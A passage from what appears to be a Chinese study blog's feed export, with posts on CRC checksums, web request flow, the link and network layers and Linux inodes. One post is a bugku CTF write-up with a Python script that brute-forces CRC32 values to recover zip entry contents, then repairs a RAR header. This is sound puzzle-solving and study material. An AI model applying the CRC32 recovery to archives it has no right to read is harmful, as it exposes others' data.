        <content type="html"><![CDATA[<h3 id="一、在计算机网络自顶向下链路层有一笔带过CRC检验，感觉这个地方很实用，也经常见所以还是认真对待了一下"><a href="#一、在计算机网络自顶向下链路层有一笔带过CRC检验，感觉这个地方很实用，也经常见所以还是认真对待了一下" class="headerlink" title="一、在计算机网络自顶向下链路层有一笔带过CRC检验，感觉这个地方很实用，也经常见所以还是认真对待了一下"></a>一、在计算机网络自顶向下链路层有一笔带过CRC检验，感觉这个地方很实用，也经常见所以还是认真对待了一下</h3><p><strong>百度百科</strong>：循环冗余校验(Cyclic Redundancy Check, CRC)是一种根据网络数据包或电脑文件等数据产生简短固定位数校验码的一种散列函数，主要用来检测或校验数据传输或者保存后可能出现的错误。它是利用除法及余数的原理来作错误侦测的<br><strong>一句话定义就是</strong>：假设数据传输过程中需要发送15位的二进制信息g=101001110100001，这串二进制码可表示为代数多项式g(x) = x^14 + x^12 + x^9 + x^8 + x^7 + x^5 + 1，其中g中第k位的值，对应g(x)中x^k的系数。将g(x)乘以x^m，既将g后加m个0，然后除以m阶多项式h(x)，得到的(m-1)阶余项r(x)对应的二进制码r就是CRC编码。<br>正常人类一下子应该看不太懂，那多说几句话。<br>1、一个不同寻常的除法运算<br>g(x)和h(x)的除运算，可以通过g和h做xor（异或）运算。比如将11001与10101做xor运算：</p><p><img src="1.gif" alt=""></p><a id="more"></a><p>明白了xor运算法则后，举一个例子使用CRC-8算法求101001110100001的效验码。CRC-8标准的h(x) = x^8 + x^7 + x^6 + x^4 + x^2 + 1，既h是9位的二进制串111010101。 </p><p><img src="2.gif" alt=""><br>经过迭代运算后，最终得到的r是10001100，这就是CRC效验码。<br>得到余数R也就是FCS，将FCS加到M上，就得到了要发送的帧。<br>M=10100111010000110001100</p><h4 id="怎么检验？："><a href="#怎么检验？：" class="headerlink" title="怎么检验？："></a>怎么检验？：</h4><p>把M循环再除111010101 最后余数一定为0，否者比特流中途出现错误</p><h3 id="二、数学推理"><a href="#二、数学推理" class="headerlink" title="二、数学推理"></a>二、数学推理</h3><p>1.设欲传输的信息有K位,如图6.1所示<br>2.首先将欲传输的数据序列m(x)乘以 XR , 其中R为g(x)的最高次冥。<br>3.将得到的多项式XR m(x)除以约定的多项式g(x)<br>4.忽略除法结果的“商”，取出其余数，并与XRm(x)相加，形成K+R位的发送序列，即：m’(x) = XRm(x) +r(x)</p><p><img src="7.png" alt=""></p><p>CRC编码过程如下：<br>设待校验的信息码有k位，即：$$m = (m^{k-1}、m^{k-2}、m^{k-3}……m^{1}、m^{0})$$, 多项式m(x)可表示为<br>$$m(x) = m^{k-1}x^{k-1}+ m^{k-2}x^{k-2} +……m^1x^1+ m^0x^0   $$———————————————————————— 式（1）</p><p>用多项式g(x)的最高次幂R对应的XR 乘以m(x)，将得到式（2）<br>$$X^Rm(x) = m^{k-1}x^{k+R-1}+ m^{k-2}x^{k+R-2} +……m^1x^{1+R}+ m^0x^0+R $$——————————————————– 式（2）</p><p>将$$X^Rm(x)$$ 模2除以g(x)，得到多项式商为A(x),余数为r(x)，即：<br>$$A(x)g(x) = X^Rm(x) +r(x) $$—————————————————————————————————–式（3）</p><p>余数多项式r(x)可表示为<br>$$r(x) = r^{R-1}x^{R-1}+ r^{R-2}x^{R-2} +……r^1x^1+ r^0x^0 $$————————————————————————————式（4）</p><p>将式（2）和式（4）代入式（3）得<br>$$A(x)g(x) = m^{k-1}x^{k+R-1}+ m^{k-2}x^{k+R-2} +……m^1x^{R+1}+ m^0x^0+R  + r^{R-1}x^{R-1}+ r^{R-2}x^{R-2} +……r^1x^1+ r^0x^0 $$  ——–式（5）</p><p>式（5）对应的码组为K+R位，即：<br>N = (mk-1+ mk-2 +……m1+ m0  + rR-1+ rR-2 +……r1+ r0) ————————————————————式（6）<br>从M到N就是CRC的编码过程mk-1+ mk-2 +……m1+ m0  为k位信息码；rR-1+ rR-2 +……r1+ r0为R位校验码。<br>在信息接收端，将接受到的K+R位码除以相同的多项式g(x),根据式（3）所产生的余数为0，则接受到的数据信息正确无误，否则则认为信息在传输过程中产生的误码。</p><h3 id="三、bugku例题："><a href="#三、bugku例题：" class="headerlink" title="三、bugku例题："></a>三、bugku例题：</h3><p><img src="3.png" alt=""></p><p>zip压缩包以及帮大家撸下来了<br><a href="/images/123.zip">123.zip</a><br><br>解压下载后的文件，发现有68个压缩文件，并且每个压缩文件里都有一个4个字节大小的名为data.txt的txt文件，还有文本所对应的CRC32码，于是尝试用crc32碰撞还原出所有压缩包中的文件内容<br><img src="22.png" alt=""><br>python3 脚本</p><pre><code>#coding:utf-8import zipfileimport stringimport binasciidef CrackCrc(crc):    for i in dic:        for j in dic:            for p in dic:                for q in dic:                    s = i + j + p + q                    if crc == (binascii.crc32(s.encode()) &amp; 0xffffffff):                        print (s)                        f.write(s)                        returndef CrackZip():    for I in range(68):        file = &#39;out&#39; + str(I) + &#39;.zip&#39;        f = zipfile.ZipFile(file, &#39;r&#39;)        GetCrc = f.getinfo(&#39;data.txt&#39;)        crc = GetCrc.CRC        #以上3行为获取压缩包CRC32值的步骤        print (hex(crc))        CrackCrc(crc)dic = string.ascii_letters + string.digits + &#39;+/=&#39;f = open(&#39;out.txt&#39;, &#39;w&#39;)CrackZip()f.close()</code></pre><p>然后out.txt文本是这样的,根据碰撞出内容的格式（末尾两个==）推断这段数据是base64编码过的，先解码，根据解码结果中的flag.txt推断这可能是一个压缩包，同时根据fix the file and get the flag知需要修复文件<br><img src="4.png" alt=""><br>将解码后的文件导入16进制编辑器（如010editor），观察数据，发现存在rar的文件尾C43D7B00400700，但缺少文件头，于是补上rar的文件头526172211A0700。</p><p><img src="5.png" alt=""><br><img src="6.png" alt=""><br><strong>试了好久不会玩winhex 尴尬，最后发现是先填充0然后覆盖</strong><br>然后改后缀名拿到了这个包<br><a href="/images/out.rar">out.rar</a> flag在注释里<br><img src="1.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络自顶向下-Web网页请求过程</title>
      <link href="/2019/03/15/ji-suan-ji-wang-luo-zi-ding-xiang-xia-web-wang-ye-qing-qiu-guo-cheng/"/>
      <url>/2019/03/15/ji-suan-ji-wang-luo-zi-ding-xiang-xia-web-wang-ye-qing-qiu-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h3 id="一、场景（假设这位同学不是在天朝，能直接访问谷歌"><a href="#一、场景（假设这位同学不是在天朝，能直接访问谷歌" class="headerlink" title="一、场景（假设这位同学不是在天朝，能直接访问谷歌"></a>一、场景（假设这位同学不是在天朝，能直接访问谷歌</h3><ol><li>学生将PC用电缆连接到学校以太网交换机，访问 <code>www.google.com</code> 。</li><li>comcast为ISP。comcast.net为学校提供DNS服务，服务器在comcast网络中。</li><li>DHCP服务器运行在路由器中。</li></ol><img src="1.png" width="400" hegiht="200" align=center /><a id="more"></a><h4 id="1、通过DHCP获得本机IP等信息-协议：DHCP"><a href="#1、通过DHCP获得本机IP等信息-协议：DHCP" class="headerlink" title="1、通过DHCP获得本机IP等信息 协议：DHCP"></a>1、通过DHCP获得本机IP等信息 协议：DHCP</h4><p>PC连接到网络时的动作</p><ol><li>PC生成DHCP请求报文，放入目的端口67和源端口68的UDP报文段。报文段放入广播目的IP地址（255.255.255.255）和源IP地址（0.0.0.0）的IP数据报中。</li><li>该数据报放入以太网帧中，目的MAC地址为广播地址48个1，源MAC地址为PC适配器MAC地址。该帧在交换机所有出口端广播。</li><li>路由器接口接收到该帧，抽取出IP数据报。广播IP地址表示该IP数据报需要节点的高层协议处理，所以分解出UDP报文上传UDP。DHCP服务器从UDP报文段中得到该请求报文。</li><li>服务器生成DHCP ACK报文，包括分配给PC的IP地址、DNS服务器IP地址、默认网关路由器IP地址（68.85.2.1）、子网块（68.80.2.0、24）。该报文放入UDP、IP数据报、以太网帧中，目的MAC地址为PC的MAC地址、源MAC地址为路由器刚刚收到帧的子网接口的MAC地址。</li><li>ACK报文发送到交换机。由于交换机通过自学习，之前从PC接收帧的时候得到MAC地址和端口的映射，所以直接将帧从连接PC的接口转发。</li><li>PC接收到帧，一步步抽取出ACK报文，记录下自己的IP地址、DNS服务器地址。配置IP转发表的默认网关，将目的地址为子网块之外的所有数据报发送向默认网关。</li></ol><p><strong>DCHP中的4步只有最后两步必须。</strong></p><h4 id="2、通过DNS获得谷歌的IP地址-协议：ARP，DNS"><a href="#2、通过DNS获得谷歌的IP地址-协议：ARP，DNS" class="headerlink" title="2、通过DNS获得谷歌的IP地址  协议：ARP，DNS"></a>2、通过DNS获得谷歌的IP地址  协议：ARP，DNS</h4><ol><li>PC生成DNS查询报文， <code>www.google.com</code> 放入报文的问题段。DNS报文放入端口号53的UDP报文段中，UDP报文段目的IP为DNS服务器的IP地址，源IP地址为PC的IP地址的IP数据报，但是缺少默认网关的目的MAC地址（只知道IP地址）。</li><li>PC发送查询默认网关MAC地址的ARP查询报文，放入广播目的地址的以太网帧。向交换机发送该帧，交换机将该帧转发给所有出口端。网关路由器收到查询报文后，准备ARP回答，包括默认网关IP和对应的MAC地址。将ARP回答放入以太网帧，目的MAC地址为PC的MAC地址。发送该帧，通过交换机交付给PC。</li><li>PC获取该帧，抽取得到网关路由器的MAC地址。将1中的数据报放入以太网帧，目的MAC地址为网关路由器的MAC地址。将帧发送给交换机，交付给网关路由器。</li><li>网关路由器接收帧，抽取IP数据报。根据目的地址和转发表，决定下一跳路由器。将IP数据报放入链路层帧，发送至下一跳路由–comcast最左边路由器。</li><li>comcast最左边路由器接收到帧，抽取IP数据报，根据目的IP地址和转发表确定出口，向DNS服务器转发数据报。转发表已经根据域内路由协议和域间路由协议填好。</li><li>DNS服务器收到IP数据报，抽取出DNS查询报文，找到对应的IP地址，生成DNS回答报文，放入UDP报文段，反向寻址到学校路由器，最后通过交换机到PC。</li><li>PC从DNS报文中抽取出 <code>www.google.com</code> 对应的IP地址。</li></ol><h4 id="3、进行客户服务器交互-协议：TCP-HTTP"><a href="#3、进行客户服务器交互-协议：TCP-HTTP" class="headerlink" title="3、进行客户服务器交互 协议：TCP,HTTP"></a>3、进行客户服务器交互 协议：TCP,HTTP</h4><ol><li>PC生成一个目的端口号80的TCP SYN报文段，放入目的IP为谷歌的IP地址的数据报中。</li><li>该数据报通过学校网络、comcast网络、谷歌网络到达谷歌服务器，服务器分配资源，产生TCP SYNACK报文段，放入数据报，反向到达PC。PC形成套接字，进入连接状态，第三次握手与之后的HTTP请求一起发送。</li><li>PC的浏览器生成获取URL的HTTP GET报文，写入套接字。生成的TCP报文段放入一个IP数据报中，到达谷歌服务器。</li><li>谷歌HTTP服务器从TCP套接字读取HTTP GET报文，生成HTTP响应报文，将请求的页面内容放入HTTP报文实体，将响应报文放入套接字，生成的TCP报文段放入IP数据报，经过网络到达PC。</li><li>PC的浏览器从套接字读取HTTP响应，从实体中抽取页面的html，显示web页面。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机网络自顶向下 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络自顶向下-链路层</title>
      <link href="/2019/03/15/ji-suan-ji-wang-luo-zi-ding-xiang-xia-lian-lu-ceng/"/>
      <url>/2019/03/15/ji-suan-ji-wang-luo-zi-ding-xiang-xia-lian-lu-ceng/</url>
      
        <content type="html"><![CDATA[<h3 id="一、链路层提供的服务"><a href="#一、链路层提供的服务" class="headerlink" title="一、链路层提供的服务"></a>一、链路层提供的服务</h3><p>1、成帧。在每个网络层数据报经链路传送之前，几乎所有链路层协议都要将其用链路层帧封装起来。<br>2、链路接入。媒体访问控制(Medium Access Control, MAC)协议规定了帧在链路上传输的规则。<br>3、可靠交付。保证无差错地经链路层移动每个网络层数据报。<br>4、差错检测和纠正。当帧中的一个比特作为1传输时，接收方结点中的链路层硬件可能不正确地将其判断为0，反之亦然。这种比特差错是由信号衰减和电磁噪声导致的。</p><a id="more"></a><h3 id="二、差错检测和纠正技术"><a href="#二、差错检测和纠正技术" class="headerlink" title="二、差错检测和纠正技术"></a>二、差错检测和纠正技术</h3><p>差错检测和纠错技术越复杂，导致的开销就越大，这就是意味着需要更多的计算量及更多的差错检测和纠错比特。</p><h4 id="2-1、三种检测差错的技术："><a href="#2-1、三种检测差错的技术：" class="headerlink" title="2.1、三种检测差错的技术："></a>2.1、三种检测差错的技术：</h4><ol><li>奇偶校验（一维奇偶校验十分简单，但未检出差错的几率较高；二维奇偶校验可检测差错，还可以纠正差错）</li><li>检验和方法（与运输层的检验和方法类似）</li><li>循环冗余检测(Cyclic Redundancy Check, CRC)</li></ol><h4 id="2-2、两种类型的网络链路"><a href="#2-2、两种类型的网络链路" class="headerlink" title="2.2、两种类型的网络链路"></a>2.2、两种类型的网络链路</h4><p>1、点对点链路。由链路一端的单个发送方和链路另一端的单个接收方组成。许多链路层协议都为点对点链路设计，如点对点协议(point-to-point protocol, PPP)和高级数据链路控制(high-level data link control, HDLC)协议。<br>2、广播链路。能够让多个发送和接收结点都连接到相同的、单一的、共享的广播信道上。广播信道通常用于局域网中。</p><h3 id="三、多路访问问题"><a href="#三、多路访问问题" class="headerlink" title="三、多路访问问题"></a>三、多路访问问题</h3><p>协调多个发送/接收点对一个共享广播信道的访问，避免碰撞，有如下几种协议：<br>    （1）信道划分协议：时分、频分、码分等，采用时分多路复用(TDM)和频分多路复用(FDM)<br>    （2）随机接入协议：碰撞后，重发该帧前等待一个随机时延，有以下几种(时隙ALOHA,ALOHA,载波侦听多路访问(CSMA)具有碰撞检测的载波侦听多路访问(CSMA/CD))<br>    例如CSMA载波侦听多路访问协议，节点在传播前先侦听信道，直到检测到一小段时间内没有信号传输，然后再开始传输，如果检测到碰撞就停止传输，继续侦听。<br>    （3）轮流协议：【1】轮询协议，有一个主节点，轮询每个节点    【2】令牌传递协议，无主节点<br>1、信道划分协议。采用时分多路复用(TDM)和频分多路复用(FDM)，在所有共享信道的结点之间划分广播信道带宽的技术。<br>2、随机接入协议。一个传输结点总是以信道的全部速率进行发送、当有碰撞时，涉及碰撞的每个结点反复地重发它的帧(也就是分组)，到该帧无碰撞地通过为止。在重发涉及碰撞的帧之前，会等待一个随机时延。涉及碰撞的每个结点独立地选择随机时延。随机接入协议又有以下几种：</p><h3 id="四、链路层地址"><a href="#四、链路层地址" class="headerlink" title="四、链路层地址"></a>四、链路层地址</h3><p>为什么我们在网络层和链路层都需要地址呢？</p><ol><li>局域网是为任意网络层协议而设计，而不只是用于IP和因特网。</li><li>如果适配器使用网络层地址而不是MAC地址，网络层地址必须存储在适配器的RAM中，并且在每次适配器移动(或加电)时要重新配置。</li></ol><p>主机和路由器中的适配器(即网络接口)具有链路层地址。要注意的是，链路层交换机没有链路层地址，因为它的任务是在主机与路由器之间承载数据报，它透明地执行该项任务，主机或路由器不必明确地将帧寻址到其间的交换机。<br>链路层地址有几种不同的称呼：<br>1、LAN地址<br>2、物理地址<br>3、MAC地址<br>大多数局域网，MAC地址长度为6字节。尽管MAC地址被设计为永久，但可以做到用软件改变一块适配器的MAC地址。没有两块适配器具有相同的MAC地址。</p><h4 id="4-1、地址解析协议-Address-Resolution-Protocol-ARP"><a href="#4-1、地址解析协议-Address-Resolution-Protocol-ARP" class="headerlink" title="4.1、地址解析协议(Address Resolution Protocol, ARP)"></a>4.1、地址解析协议(Address Resolution Protocol, ARP)</h4><p>ARP将一个IP地址解析为一个MAC地址。在很多方面它和DNS类似，DNS将主机名解析为IP地址。<br>它们之间的重要区别是：<strong>DNS为在因特网中任何地方的主机解析主机名，而ARP只为在同一个子网上的主机和路由器接口解析IP地址。</strong><br>每台主机或路由器在其内存中有一个ARP表，包含IP地址到MAC地址的映射关系。如果一台主机要发送一个数据报到子网中的另一台主机，发送方需要获得给定IP地址的目的主机的MAC地址，如果发送方ARP表具有该目的结点的表项，这个任务很容易完成了如果没有，发送方会向它的适配器传递一个ARP查询分组，并且指示适配器应该用MAC广播地址(即FF-FF-FF-FF-FF-FF)来发送这个分组。</p><p>ARP协议需要注意的两件事<br>1、查询ARP报文是在广播帧中发送的，而响应ARP报文在一个标准帧中发送<br>2、ARP是即插即用的，意思是一个ARP表是自动建立的，它不需要系统管理员来配置。并且如果某主机与子网断开连接，它的表项最终会从留在子网中的结点的表中删除掉。</p><h4 id="4-2、以太网"><a href="#4-2、以太网" class="headerlink" title="4.2、以太网"></a>4.2、以太网</h4><p>以太网帧结构<br><img src="1.webp" alt=""></p><ol><li>前同步码(8字节)。前同步码的前7个字节值都为10101010，最后一个字节为10101011。前7个字节用于“唤醒”接收适配器，并且将它们的时钟和发送方的时钟同步。</li><li>目的地址(6字节)。目的适配器的MAC地址。</li><li>源地址(6字节)。源适配器的MAC地址。</li><li>类型(2字节)。该字段允许以太网复用多种网络层协议。要记住主机能够使用除了IP以外的其他网络层协议。</li><li>数据(46~1500字节)。承载IP数据报。以太网最大传输单元(MTU)为1500字节，如果超过1500字节，主机必须将该数据报分片。数据字段的最小长度为46字节，少于则被填充到46字节。</li><li>CRC(4字节)。循环冗余检测字段，检测帧是否引入了差错。<br>所以以太网技术都向网络层提供无连接服务。即适配器A向适配器B发送数据报时不需要先与适配器B“握手”。这种无连接服务类似于IP的第三层数据报服务和UDP的第四层无连接服务。</li></ol><h4 id="4-3、链路层交换机"><a href="#4-3、链路层交换机" class="headerlink" title="4.3、链路层交换机"></a>4.3、链路层交换机</h4><p>交换机的过滤和转发<br>1、过滤是决定一个帧应该转发到某个接口还是应当将其丢弃<br>2、转发是决定一个帧应该被导向哪个接口，并把该帧移动到那些接口</p><p>链路层交换机的过滤和转发功能借助于交换机表。转发分组基于MAC地址。</p><h4 id="4-4、链路层交换机的自学习"><a href="#4-4、链路层交换机的自学习" class="headerlink" title="4.4、链路层交换机的自学习"></a>4.4、链路层交换机的自学习</h4><p>1、交换机表初始为空<br>2、当在每个接口接收到的每个入帧，该交换机在其表中存储：（1）在该帧源地址字段中的MAC地址（2）该帧到达的接口（3）当前时间。<br>3、如果在一段时间内，交换机没有接收到以该地址作为源地址的帧，就在表中删除这个地址。<br>链路层交换机是全双工的，任何交换机接口能够同时发送和接收。</p><h4 id="4-5、链路层交换机和路由器的比较"><a href="#4-5、链路层交换机和路由器的比较" class="headerlink" title="4.5、链路层交换机和路由器的比较"></a>4.5、链路层交换机和路由器的比较</h4><p>1、交换机<br>优点：<br>（1）即插即用<br>（2）相对高的分组过滤和转发速率<br>缺点：<br>（1）为了防止广播帧的循环，交换网络的活跃拓扑限制为一棵生成树<br>（2）一个大型交换网络要求在主机和路由器中有大的ARP表，这将生成可观的ARP流量和处理量<br>（3）对广播风暴不提供任何保护措施，如果某主机出了故障并传输出没完没了的以太网广播帧流，该交换机将转发所有这些帧，使得整个以太网崩溃<br>2、路由器<br>优点：<br>（1）网络寻址通常是分层次的(不像MAC寻址是扁平的)。即使网络中存在冗余路径时，分组通常也不会通过路由器循环。所以，分组不会被限制到一棵生成树上，并可以使用源和目的地之间的最佳路径。因为没有生成树的限制，所以它们允许以丰富的拓扑结构构件因特网，如包括欧洲和北美之间的多条活跃链路<br>（2）对第二层的广播风暴提供了防火墙保护<br>缺点：<br>（1）不是即插即用<br>（2）对每个分组的处理时间通常比交换机更长</p><p><img src="2.webp" alt=""></p><h4 id="4-6、虚拟局域网"><a href="#4-6、虚拟局域网" class="headerlink" title="4.6、虚拟局域网"></a>4.6、虚拟局域网</h4><p>上述的局域网有三个缺点<br>1、缺乏流量隔离<br>2、交换机的无效使用<br>3、不方便管理用户</p><p>支持VLAN的交换机允许经一个单一的物理局域网基础设施定义多个虚拟局域网。在一个VLAN内的主机彼此通信，仿佛它们与交换机相连。</p><h5 id="以太网VLAN帧"><a href="#以太网VLAN帧" class="headerlink" title="以太网VLAN帧"></a>以太网VLAN帧</h5><p><img src="3.webp" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络自顶向下 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一次删除带特殊字符文件名的文件中学习Linux索引节点inode</title>
      <link href="/2019/03/13/cong-yi-ci-shan-chu-dai-te-shu-zi-fu-wen-jian-ming-de-wen-jian-zhong-xue-xi-linux-suo-yin-jie-dian-inode/"/>
      <url>/2019/03/13/cong-yi-ci-shan-chu-dai-te-shu-zi-fu-wen-jian-ming-de-wen-jian-zhong-xue-xi-linux-suo-yin-jie-dian-inode/</url>
      
        <content type="html"><![CDATA[<h3 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h3><p>在很久很久之前，一个很傻很傻的刘萌新不知何因上传了一个带特殊字符文件名的文件到服务器中，于是他想着怎么删除。<br><img src="1.png" alt=""><br>方法1、从面板中删除，然而面板和萌新一样垃圾，在文件管理中根本不显示这个文件<br>方法2、xshell连接，rm -rf一梭子下去 ，但是文件名你不能输入，并且同目录下有其他重要的东西。<br><img src="2.png" alt=""><br>然后你会想通过 | grep 啦正则啦 一梭子来找到那个文件，没错本萌新就是这样的 ε=ε=ε=┏(゜ロ゜;)┛。但是还是找不到</p><a id="more"></a><p><img src="3.png" alt=""><br>直到你发现了一个叫inode的东西</p><h4 id="1、inode简介"><a href="#1、inode简介" class="headerlink" title="1、inode简介"></a>1、inode简介</h4><p>理解inode，要从文件储存说起。<br>文件储存在硬盘上，硬盘的最小存储单位叫做”扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。<br>操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个”块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector组成一个 block。<br>文件数据都储存在”块”中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。</p><h4 id="2、inode的内容"><a href="#2、inode的内容" class="headerlink" title="2、inode的内容"></a>2、inode的内容</h4><p>inode包含文件的元信息，具体来说有以下内容：<br>    * 文件的字节数<br>    * 文件拥有者的User ID<br>    * 文件的Group ID<br>    * 文件的读、写、执行权限<br>    * 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。<br>    * 链接数，即有多少文件名指向这个inode<br>    * 文件数据block的位置<br>    可以用stat命令，查看某个文件的inode信息：</p><pre><code>[root@localhost /]# stat example.txt  </code></pre><h4 id="3、inode号码"><a href="#3、inode号码" class="headerlink" title="3、inode号码"></a>3、inode号码</h4><p>每个inode都有一个号码，操作系统用inode号码来识别不同的文件。<br>    这里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。<br>     使用ls -i命令，可以看到文件名对应的inode号码：</p><pre><code>[root@localhost /]# ls -i test.txt   6970 test.txt  </code></pre><p><img src="7.png" alt=""></p><h4 id="4、硬链接"><a href="#4、硬链接" class="headerlink" title="4、硬链接"></a>4、硬链接</h4><p>一般情况下，文件名和inode号码是”一一对应”关系，每个inode号码对应一个文件名。但是，Unix/Linux系统，允许多个文件名指向同一个inode号码。这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访问。这种情况就被称为”硬链接”（hard link）。</p><h4 id="5、软链接"><a href="#5、软链接" class="headerlink" title="5、软链接"></a>5、软链接</h4><p>除了硬链接以外，还有一种特殊情况。文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。因此，无论打开哪一个文件，最终读取的都是文件B。这时，文件A就称为文件B的”软链接”（soft link）或者”符号链接（symbolic link）。<br>这意味着，文件A依赖于文件B而存在，如果删除了文件B，打开文件A就会报错：”No such file or directory”。这是软链接与硬链接最大的不同：文件A指向文件B的文件名，而不是文件B的inode号码，文件B的inode”链接数”不会因此发生变化。<br>ln -s命令可以创建软链接。</p><h3 id="当我们知道有inode号码这么个东西后，那么刘萌新的问题就能迎刃而解了"><a href="#当我们知道有inode号码这么个东西后，那么刘萌新的问题就能迎刃而解了" class="headerlink" title="当我们知道有inode号码这么个东西后，那么刘萌新的问题就能迎刃而解了"></a>当我们知道有inode号码这么个东西后，那么刘萌新的问题就能迎刃而解了</h3><p><img src="4.png" alt=""><br><img src="5.png" alt=""><br><img src="6.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络自顶向下-网络层</title>
      <link href="/2019/03/13/ji-suan-ji-wang-luo-zi-ding-xiang-xia-wang-luo-ceng/"/>
      <url>/2019/03/13/ji-suan-ji-wang-luo-zi-ding-xiang-xia-wang-luo-ceng/</url>
      
        <content type="html"><![CDATA[<h3 id="网络层提供的服务"><a href="#网络层提供的服务" class="headerlink" title="网络层提供的服务"></a>网络层提供的服务</h3><p>网络层提供主机到主机的通信服务。</p><h3 id="一、转发和路由选择"><a href="#一、转发和路由选择" class="headerlink" title="一、转发和路由选择"></a>一、转发和路由选择</h3><p>区别：转发是将分组从一个输入链路接口转移到适当的输出链路接口的路由器<code>本地动作</code>。路由选择是<code>网络范围</code>的过程，决定分组从源到目的地所采取的端到端路径。<br>考虑旅行者从宾夕法尼亚州到佛罗里达州的行程，转发就类似于图中要经过很多立交桥，离开每个立交桥的时候才决定走哪一条路，而路由选择像出发前旅行者就看地图在许多可能的路径(每条路径包含多个立交桥)中选择一条路线。</p><a id="more"></a><h3 id="二、虚电路和数据报网络"><a href="#二、虚电路和数据报网络" class="headerlink" title="二、虚电路和数据报网络"></a>二、虚电路和数据报网络</h3><p>目前所有网络层不同时提供两种不同服务，在网络层提供连接服务被称为虚电路（VC）网络，在网络层提供无连接服务的计算机网络称为数据报网络。</p><h5 id="虚电路："><a href="#虚电路：" class="headerlink" title="虚电路："></a>虚电路：</h5><p>属于一条虚电路的分组将在首部携带一个VC号，因为一条虚电路在每条链路上可能具有不同的VC号，每台中间路由器必须用一个新的VC号来替代每个传输分组的VC号。新VC号从转发表获得。<br>无论何时跨越一台路由器创建一条新的虚电路，转发表就增加了一个新表项。类似地，无论何时终止一条虚电路，沿着该途径每个表中的相应项将被删除。</p><h5 id="数据报网络"><a href="#数据报网络" class="headerlink" title="数据报网络:"></a>数据报网络:</h5><p>在数据报网络中，每台路由器由一个将目的地址映射到链路接口的转发表，当分组到达路由器时，路由器使用该分组的目的底子好在转发表中查找适当的输出链路接口。然后路由器有意将分组向该输出链路接口转发。<br><img src="1.png" alt=""></p><h3 id="三、路由器的工作原理"><a href="#三、路由器的工作原理" class="headerlink" title="三、路由器的工作原理"></a>三、路由器的工作原理</h3><p>一台路由器的<code>输入端口</code>，<code>输出端口</code>和<code>交换结构与</code>共同实现了这种转发功能，而且总是用硬件实现。这些转发功能有时总称为路由器转发平面。</p><h4 id="路由器的组成部分"><a href="#路由器的组成部分" class="headerlink" title="路由器的组成部分"></a>路由器的组成部分</h4><h5 id="输入端口："><a href="#输入端口：" class="headerlink" title="输入端口："></a>输入端口：</h5><ol><li>执行将一条输入的物理链路与路由器相连接的物理层功能</li><li>执行与位于入链路远端的数据链路层交互的数据链路层功能</li><li>查找功能，查询转发表决定路由器的输出端口，将分组转发到输出端口<h5 id="交换结构"><a href="#交换结构" class="headerlink" title="交换结构"></a>交换结构</h5></li><li>将路由器的输入端口与输出端口相连</li><li>分组通过交换结构转发到输出端口<h5 id="输出端口"><a href="#输出端口" class="headerlink" title="输出端口"></a>输出端口</h5></li><li>存储从交换结构接收的分组，执行必要的链路层和物理层功能在输入链路上传输这些分组。</li><li>当链路是双向的时，输出端口与输入端口在同一线路卡成对出现<h5 id="路由选择处理器"><a href="#路由选择处理器" class="headerlink" title="路由选择处理器"></a>路由选择处理器</h5></li><li>执行路由选择协议</li><li>维护路由选择表、连接的链路状态信息，为路由器计算转发表</li><li>网络管理<h5 id="路由转发平面"><a href="#路由转发平面" class="headerlink" title="路由转发平面"></a>路由转发平面</h5></li><li>一台路由器的输入端口、输出端口和交换结构共同实现了转发功能，并且用硬件实现（软件太慢，需以纳秒时间尺度运行）<h5 id="路由控制平面"><a href="#路由控制平面" class="headerlink" title="路由控制平面"></a>路由控制平面</h5></li><li>路由器的控制功能（执行路由选择协议、对上线或者下线链路进行响应、管理功能），在毫秒时间尺度上运行，用软件实现并在选择处理器上执行（一种cpu）</li></ol><h4 id="三种交换模式"><a href="#三种交换模式" class="headerlink" title="三种交换模式"></a>三种交换模式</h4><h5 id="经内存交换"><a href="#经内存交换" class="headerlink" title="经内存交换"></a>经内存交换</h5><p>一个分组到达输入端口时，该端口会先通过中断方式向路由选择处理器发出信号<br>分组从输入端口复制到处理器内存中（现代路由器查找交换进内存，是由输入线路卡处理的）<br>早期路由选择处理器从首部提取目的地址，在转发表查找输出端口，将分组复制到输出端口</p><h5 id="经总线交换"><a href="#经总线交换" class="headerlink" title="经总线交换"></a>经总线交换</h5><p>输入端口经一根共享总线将分组直接传送到输出端口，无需路由选择处理器的干预<br>路由器的交换带宽受总线速率限制</p><h5 id="经互联网络交换"><a href="#经互联网络交换" class="headerlink" 